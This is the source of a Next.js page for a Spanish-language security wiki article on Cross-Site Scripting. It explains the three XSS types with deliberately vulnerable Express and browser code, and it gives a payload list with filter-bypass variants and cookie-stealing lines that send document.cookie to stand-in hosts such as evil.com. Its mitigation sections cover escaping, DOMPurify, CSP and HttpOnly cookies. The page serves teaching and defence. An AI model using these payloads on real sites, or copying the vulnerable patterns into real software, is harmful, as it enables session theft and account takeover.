'use client';

import Link from 'next/link';
import { useParams } from 'next/navigation';
import { Home, AlertTriangle, Code, Shield, Terminal } from 'lucide-react';

export default function XSSPage() {
  const params = useParams();
  const locale = params.locale as string;

  return (
    <div className="min-h-screen">
      <div className="bg-white dark:bg-slate-900/50 border-b border-slate-200 dark:border-slate-700 px-8 py-4">
        <div className="max-w-5xl mx-auto flex items-center gap-2 text-sm">
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors flex items-center gap-1">
            <Home className="w-4 h-4" />
            Wiki
          </Link>
          <span className="text-slate-600">/</span>
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors">
            Vulnerabilidades
          </Link>
          <span className="text-slate-600">/</span>
          <span className="text-white dark:text-white">Cross-Site Scripting (XSS)</span>
        </div>
      </div>

      <div className="bg-gradient-to-r from-red-600 via-orange-600 to-red-600 px-8 py-12">
        <div className="max-w-5xl mx-auto">
          <div className="flex items-center gap-3 mb-4">
            <div className="px-3 py-1 bg-green-500/20 text-green-700 dark:text-green-300 rounded-lg text-sm font-medium border border-green-500/30">
              Principiante
            </div>
            <div className="px-3 py-1 bg-red-500/30 text-red-200 rounded-lg text-sm font-medium border border-red-400/40">
              CVSS 7.2 - Alto
            </div>
            <div className="px-3 py-1 bg-white/10 backdrop-blur-sm text-slate-900 dark:text-white rounded-lg text-sm">
              22 min lectura
            </div>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4 flex items-center gap-4">
            <AlertTriangle className="w-12 h-12" />
            Cross-Site Scripting (XSS)
          </h1>
          <p className="text-xl text-red-100">
            Inyección de scripts maliciosos en páginas web vistas por otros usuarios
          </p>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-8 py-12">
        <div className="prose prose-invert prose-lg max-w-none">
          
          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">¿Qué es XSS?</h2>
            <p className="text-slate-700 dark:text-slate-300 mb-6">
              Cross-Site Scripting (XSS) es una vulnerabilidad que permite a un atacante inyectar código JavaScript 
              malicioso en páginas web vistas por otros usuarios. Esto ocurre cuando la aplicación incluye datos no 
              confiables en una página web sin validación o escape adecuados.
            </p>
            
            <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-6 mb-6">
              <h3 className="text-xl font-semibold text-red-600 dark:text-red-400 mb-3">Impacto</h3>
              <ul className="text-slate-700 dark:text-slate-300 space-y-2">
                <li>• Robo de cookies y tokens de sesión</li>
                <li>• Phishing mediante páginas falsas inyectadas</li>
                <li>• Keylogging y captura de datos sensibles</li>
                <li>• Redirección a sitios maliciosos</li>
                <li>• Defacement (modificar apariencia del sitio)</li>
                <li>• Distribución de malware</li>
              </ul>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Tipos de XSS</h2>
            
            <div className="space-y-6">
              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-2xl font-semibold text-red-600 dark:text-red-400 mb-4">1. Reflected XSS (No Persistente)</h3>
                <p className="text-slate-700 dark:text-slate-300 mb-4">
                  El script malicioso se refleja inmediatamente en la respuesta. El atacante debe engañar a la víctima 
                  para que haga clic en un enlace malicioso.
                </p>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm mb-4">
                  <pre className="text-red-600 dark:text-red-400">
{`// URL maliciosa
https://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>

// Código vulnerable (Express.js)
app.get('/search', (req, res) => {
  const query = req.query.q;
  // ❌ VULNERABLE: insertar directamente en HTML
  res.send(\`
    <h1>Resultados para: \${query}</h1>
    <p>No se encontraron resultados</p>
  \`);
});

// HTML generado (script se ejecuta)
<h1>Resultados para: <script>alert(document.cookie)</script></h1>`}
                  </pre>
                </div>
                <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-4">
                  <p className="text-sm text-yellow-100">
                    <strong>Vector de ataque:</strong> Enlaces en emails, mensajes, sitios comprometidos
                  </p>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-2xl font-semibold text-red-600 dark:text-red-400 mb-4">2. Stored XSS (Persistente)</h3>
                <p className="text-slate-700 dark:text-slate-300 mb-4">
                  El script malicioso se almacena en el servidor (base de datos) y se ejecuta cada vez que se carga la página.
                  Es el tipo más peligroso de XSS.
                </p>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm mb-4">
                  <pre className="text-red-600 dark:text-red-400">
{`// Atacante envía comentario malicioso
POST /api/comments
{
  "text": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
  "postId": 123
}

// Código vulnerable
app.post('/api/comments', async (req, res) => {
  const { text, postId } = req.body;
  // ❌ VULNERABLE: guardar sin sanitizar
  await db.comments.create({ text, postId });
  res.json({ success: true });
});

// Al cargar comentarios
app.get('/posts/:id', async (req, res) => {
  const comments = await db.comments.find({ postId: req.params.id });
  // ❌ VULNERABLE: renderizar sin escape
  res.send(\`
    <div class="comments">
      \${comments.map(c => \`<p>\${c.text}</p>\`).join('')}
    </div>
  \`);
});

// Cada usuario que vea el post ejecutará el script`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-2xl font-semibold text-red-600 dark:text-red-400 mb-4">3. DOM-based XSS</h3>
                <p className="text-slate-700 dark:text-slate-300 mb-4">
                  La vulnerabilidad existe en el código JavaScript del cliente, no en el servidor.
                </p>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-red-600 dark:text-red-400">
{`// URL maliciosa
https://site.com/#<img src=x onerror=alert(document.cookie)>

// Código vulnerable (Frontend)
const hash = window.location.hash.substring(1);
// ❌ VULNERABLE: insertar directamente en DOM
document.getElementById('content').innerHTML = hash;

// Otros sinks peligrosos
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput, 100);
element.setAttribute('href', userInput); // puede ser javascript:
window.location = userInput;`}
                  </pre>
                </div>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Ejemplos de Payloads XSS</h2>
            <div className="bg-slate-100 dark:bg-slate-800/50 rounded-xl p-6 font-mono text-sm overflow-x-auto">
              <pre className="text-orange-400">
{`<!-- Básico -->
<script>alert('XSS')</script>

<!-- Robo de cookies -->
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<!-- IMG tag -->
<img src=x onerror="alert('XSS')">

<!-- SVG -->
<svg onload="alert('XSS')">

<!-- Iframe -->
<iframe src="javascript:alert('XSS')"></iframe>

<!-- Event handlers -->
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<marquee onstart="alert('XSS')">

<!-- Bypass filters -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<SCRIPT>alert('XSS')</SCRIPT>
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script> <!-- base64 -->

<!-- Mutation XSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- HTML entities bypass -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Unicode/hex bypass -->
<script>\\u0061lert('XSS')</script>
<script>\\x61lert('XSS')</script>`}
              </pre>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6 flex items-center gap-3">
              <Shield className="w-8 h-8 text-green-600 dark:text-green-400" />
              Prevención y Mitigación
            </h2>
            
            <div className="space-y-6">
              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">1. Output Encoding / Escaping</h3>
                <p className="text-slate-700 dark:text-slate-300 mb-4">Escapar caracteres especiales según el contexto.</p>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`// React (auto-escaping)
function Comment({ text }) {
  return <p>{text}</p>; // ✅ React escapa automáticamente
}

// NUNCA usar dangerouslySetInnerHTML sin sanitizar
// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ✅ Sanitizar primero
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />

// Node.js / Express
const escapeHtml = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(\`<h1>Resultados para: \${query}</h1>\`);
});`}
                  </pre>
                </div>
              </div>

              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">2. Content Security Policy (CSP)</h3>
                <p className="text-slate-700 dark:text-slate-300 mb-4">Header HTTP que restringe qué scripts pueden ejecutarse.</p>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`// Next.js - next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' https://trusted-cdn.com",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' https://api.example.com",
      "frame-ancestors 'none'"
    ].join('; ')
  }
];

module.exports = {
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }];
  }
};

// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'nonce-random123'"
  );
  next();
});`}
                  </pre>
                </div>
              </div>

              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">3. HttpOnly Cookies</h3>
                <p className="text-slate-700 dark:text-slate-300 mb-4">Prevenir acceso a cookies vía JavaScript.</p>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`// Express.js
res.cookie('sessionId', token, {
  httpOnly: true,    // No accesible via JavaScript
  secure: true,      // Solo HTTPS
  sameSite: 'strict' // Protección CSRF
});

// Next.js API Route
export default function handler(req, res) {
  res.setHeader('Set-Cookie', [
    \`token=\${token}; HttpOnly; Secure; SameSite=Strict; Path=/\`
  ]);
}`}
                  </pre>
                </div>
              </div>

              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">4. Validación de Entrada</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`// Whitelist permitidos
const allowedTags = ['b', 'i', 'u', 'p', 'br'];

// Sanitización con DOMPurify
import DOMPurify from 'isomorphic-dompurify';

const cleanHtml = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: allowedTags,
  ALLOWED_ATTR: []
});

// Validación con Joi
const schema = Joi.object({
  comment: Joi.string()
    .max(500)
    .pattern(/^[a-zA-Z0-9\\s.,!?-]+$/) // solo caracteres seguros
    .required()
});`}
                  </pre>
                </div>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6 flex items-center gap-3">
              <Terminal className="w-8 h-8 text-cyan-600 dark:text-cyan-400" />
              Laboratorio Práctico
            </h2>
            <div className="bg-cyan-500/10 border border-cyan-500/30 rounded-xl p-6">
              <p className="text-slate-700 dark:text-slate-300 mb-4">
                Practica identificando y explotando XSS en un entorno seguro:
              </p>
              <Link
                href={`/${locale}/labs/blue-team/xss`}
                className="inline-flex items-center gap-2 px-6 py-3 bg-cyan-600 hover:bg-cyan-700 text-slate-900 dark:text-white rounded-xl font-semibold transition-all"
              >
                <Terminal className="w-5 h-5" />
                Ir al Laboratorio XSS
              </Link>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Recursos Adicionales</h2>
            <div className="bg-white/5 border border-white/10 rounded-xl p-6 space-y-3">
              <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noopener noreferrer" 
                 className="block text-blue-600 dark:text-blue-400 hover:text-blue-700 dark:text-blue-300 hover:underline">
                → OWASP - Cross Site Scripting (XSS)
              </a>
              <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer"
                 className="block text-blue-600 dark:text-blue-400 hover:text-blue-700 dark:text-blue-300 hover:underline">
                → PortSwigger Academy - XSS
              </a>
              <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer"
                 className="block text-blue-600 dark:text-blue-400 hover:text-blue-700 dark:text-blue-300 hover:underline">
                → XSS Filter Evasion Cheat Sheet
              </a>
            </div>
          </section>

          <div className="bg-gradient-to-r from-red-600/20 to-orange-600/20 border border-red-500/30 rounded-xl p-8 text-center">
            <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente Paso</h3>
            <p className="text-slate-700 dark:text-slate-300 mb-6">
              Aprende sobre otra vulnerabilidad crítica de inyección
            </p>
            <Link
              href={`/${locale}/wiki/vulnerabilidades/csrf`}
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 text-slate-900 dark:text-white rounded-xl font-semibold transition-all transform hover:scale-105"
            >
              Cross-Site Request Forgery (CSRF)
              <span>→</span>
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
}
